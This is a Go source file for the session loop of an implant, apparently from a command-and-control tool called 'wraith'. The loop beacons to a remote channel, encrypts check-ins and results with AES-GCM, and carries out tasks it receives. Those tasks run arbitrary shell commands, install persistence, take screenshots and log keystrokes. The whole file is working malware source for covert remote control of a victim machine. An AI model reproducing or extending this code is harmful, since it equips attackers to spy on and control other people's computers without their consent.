package agent

import (
	"fmt"
	"strings"
	"time"
	"github.com/Kronoscba/wraith/agent/comms"
	"github.com/Kronoscba/wraith/agent/crypto"
	"github.com/Kronoscba/wraith/agent/modules"
)

type Session struct {
	Channel comms.Channel
	AgentID string
	Interval time.Duration
	Key      []byte
}

func NewSession(id string, ch comms.Channel, interval time.Duration, key []byte) *Session {
	return &Session{
		AgentID:  id,
		Channel:  ch,
		Interval: interval,
		Key:      key,
	}
}

// Run starts the beaconing loop.
func (s *Session) Run() {
	for {
		err := s.Channel.Connect()
		if err == nil {
			// 1. Check-in
			payload := []byte("CHECKIN:" + s.AgentID)
			encrypted, _ := crypto.EncryptAESGCM(payload, s.Key)
			s.Channel.Send(encrypted)

			// 2. Wait for Task
			data, err := s.Channel.Receive()
			if err == nil {
				decrypted, err := crypto.DecryptAESGCM(data, s.Key)
				if err != nil {
					continue
				}
				msg := string(decrypted)
				if len(msg) > 5 && msg[:5] == "TASK:" {
					parts := strings.SplitN(msg[5:], ":", 2)
					if len(parts) == 2 {
						taskID := parts[0]
						cmdLine := parts[1]
						
						// Execute command
						cmdParts := strings.Fields(cmdLine)
						if len(cmdParts) > 0 {
							var result string
							var err error

							switch cmdParts[0] {
							case "shell":
								if len(cmdParts) > 1 {
									result, err = modules.ExecuteCommand(cmdParts[1], nil)
								}
							case "persist":
								err = modules.Persist()
								result = "Persistence attempted"
							case "screenshot":
								data, e := modules.Screenshot()
								if e == nil {
									result = fmt.Sprintf("Screenshot captured: %d bytes", len(data))
								}
								err = e
							case "keylog":
								res, e := modules.Keylogger(60)
								if e == nil {
									result = res
								}
								err = e
							default:
								// Default to shell if not a known module
								result, err = modules.ExecuteCommand(cmdParts[0], cmdParts[1:])
							}

							if err != nil {
								result = "Error: " + err.Error()
							}
							
							resPayload := []byte("RESULT:" + taskID + ":" + result)
							encryptedRes, _ := crypto.EncryptAESGCM(resPayload, s.Key)
							s.Channel.Send(encryptedRes)
						}
					}
				}
			}
			s.Channel.Close()
		}
		time.Sleep(s.Interval)
	}
}
